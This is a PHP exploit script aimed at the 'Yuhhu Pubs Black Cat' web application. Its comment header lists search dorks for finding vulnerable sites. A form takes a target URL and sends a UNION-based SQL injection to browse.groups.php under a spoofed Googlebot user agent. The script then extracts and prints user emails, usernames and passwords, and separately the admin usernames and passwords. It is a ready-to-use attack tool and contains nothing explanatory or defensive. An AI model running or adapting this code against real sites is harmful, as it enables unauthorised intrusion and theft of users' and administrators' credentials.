<?php
/*
Coded By RMx
Yuhhu Pubs Black Cat Remote SQL Injection Exploit
Coderx.Org & Biyosecurity.com
Thanx : Liz0zim - Otistiq
Script Demo & Sales :
http://www.iamilkay.net/index.php/scriptler/arkadaslikscriptleri/yuhhuscript/6-yuhhuserisi/8-pubs
Dork --> inurl: browse.groups.php
Dork 2 --> inurl:browse.events.php
Dork 3 --> browse.music.php
Dork 4 --> browse.groups.php
*/
set_time_limit(0);
error_reporting(0);
echo "
<title>Yuhhu Pubs Exploit [ Coded By RMx ]</title>
<form action='' method=post>
USERS EXPLOIT :<br>
?rnek :http://www.example.com<br>
<input type=text name='site'>
<input type=submit value=RMx>
</form>";
if (isset($_POST['site']))
{
$site=$_POST['site'];
$hacker="browse.groups.php?category=-1+union+select+1,2,3,concat(0x656D61696C3A20,email,0x206B756C6C616E6963693A20,username,0x2073696672653A20,password),5,6,7,8,9+from+joovili_users";
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, $site."/".$hacker);
curl_setopt($curl, CURLOPT_USERAGENT, 'Googlebot/2.1
(+http://www.google.com/bot.html)');
curl_setopt($curl, CURLOPT_REFERER, 'http://www.google.com');
$html = curl_exec($curl);
curl_close($curl);
preg_match_all('#<td class=\"text_4_css_bold\">(.*)<\/td>#',$html,$huseyin);
foreach ($huseyin[1] as $biyosecurity)
{
echo $biyosecurity ."<br>";
}
}

echo "

<form action='' method=post>
ADMIN EXPLOIT :<br>
?rnek :http://www.example.com<br>
<input type=text name='admin'>
<input type=submit value=RMx>
</form>";
if (isset($_POST['admin']))
{
$site=$_POST['admin'];
$hacker="browse.groups.php?category=-1+union+select+1,2,3,concat(0x206B756C6C616E6963693A20,admin_username,0x2073696672653A20,admin_password),5,6,7,8,9+from+joovili_admins";
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, $site."/".$hacker);
curl_setopt($curl, CURLOPT_USERAGENT, 'Googlebot/2.1
(+http://www.google.com/bot.html)');
curl_setopt($curl, CURLOPT_REFERER, 'http://www.google.com');
$html = curl_exec($curl);
curl_close($curl);
preg_match_all('#<td class=\"text_4_css_bold\">(.*)<\/td>#',$html,$huseyin);
foreach ($huseyin[1] as $biyosecurity)
{
echo $biyosecurity ."<br>";
}
}
?>
